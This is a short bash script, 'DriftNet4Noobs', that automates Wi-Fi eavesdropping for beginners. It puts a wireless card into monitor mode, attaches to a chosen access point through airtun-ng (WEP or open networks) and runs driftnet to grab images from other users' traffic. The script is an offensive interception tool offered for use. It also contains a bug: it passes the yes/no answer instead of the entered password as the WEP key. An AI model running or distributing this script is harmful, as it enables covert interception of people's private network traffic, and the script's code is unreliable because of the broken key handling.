#!/bin/bash
#DriftNet4Noobs v1.0 //Kyle Atkins\\
#Requires Linux root user / aircrack suite / common sense
echo "
 _____   _     _  ______  _______  _    _    _     _                _          
(_____) (_)   (_)(______)(__ _ __)(_)  (_)  (_)   (_)              (_)    ____ 
(_)  (_)(__)_ (_)(_)__      (_)   (_)__(_)_ (__)_ (_)  ___    ___  (_)_  (____)
(_)  (_)(_)(_)(_)(____)     (_)   (________)(_)(_)(_) (___)  (___) (___)_(_)__ 
(_)__(_)(_)  (__)(_)____    (_)        (_)  (_)  (__)(_)_(_)(_)_(_)(_)_(_)_(__)
(_____) (_)   (_)(______)   (_)        (_)  (_)   (_) (___)  (___) (____)(____)
                                                                               
"
echo -e "\e[36m Hello, $USER Setting up sniffing enviroment"
echo -e "\e[4mPASSWORD SECURED NETWORKS ONLY WORK IF WEP ENCRYPTION!!!"
echo -e "\e[0m"
eval "airmon-ng start wlan0"
sleep 0.5
echo -e "\e[92m Which BSSID would you like to capture from?(ie 00:11:22:33:44)"
read bssid
echo -n "Does this network have a wifi password?:[Y/n] "
read pass_answer
if [[ ($pass_answer = "y") || ($pass_answer = "Y") ]];
	then
	echo -n "What is the password?"
	read wifi_password
	echo "Ok running airtun-ng now..."
	eval "airtun-ng -a $bssid -w $pass_answer -t 1 mon0"
	eval "ifconfig at0 up"
	eval "driftnet -v -i at0"
else
	echo "Ok no password.."
	eval "airtun-ng -a $bssid -t 1 mon0"
	sleep 0.5
	eval "ifconfig at0 up"
	sleep 0.5
	eval "driftnet -v -i at0"
fi
echo "End of the line"